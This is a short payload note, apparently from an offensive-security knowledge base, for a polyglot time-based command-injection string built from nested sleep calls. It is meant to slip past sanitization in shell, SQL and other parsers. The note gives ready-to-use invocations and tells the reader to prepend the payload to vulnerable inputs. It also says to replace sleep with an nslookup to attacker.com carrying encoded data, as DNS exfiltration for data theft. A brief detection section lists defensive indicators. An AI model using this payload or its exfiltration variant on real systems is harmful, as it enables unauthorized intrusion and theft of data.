---
type: code
language: bash
verified: true
platforms:
  - Linux
tags:
  - polyglot
  - command-injection
  - blind-test
  - multi-parser
validated: true
---

# Universal-Polyglot-Sleep-Payload-Type2

## Code

```bash
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

## Description

This universal polyglot payload triggers a 5-second sleep across multiple interpreters (/* */ for SQL/C, ` for Bash, || for conditionals, - for arithmetic) to bypass diverse sanitization. Ideal for testing blind injections in mixed-language backends; replace sleep with DNS exfil commands for data theft.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| YOURCMD | Benign prefix command (e.g., echo 1 or ping -c1 127.0.0.1) | echo 1 |
| 5 | Sleep duration in seconds | 5 |

## Usage

Prepend to vulnerable inputs (e.g., ?cmd=YOURCMD/payload). For exfiltration: Replace sleep(5) with nslookup$(encoded_data).attacker.com. Confirm via response delays or DNS logs.

## Detection

- Input patterns with nested comments (/*, `, ||) and command chaining.
- Shell logs showing sleep or nslookup executions from web contexts.
- DNS query volume spikes from application servers.

## Related

- [[procedures/Polyglot-Command-Injection-for-DNS-Data-Exfiltration]]
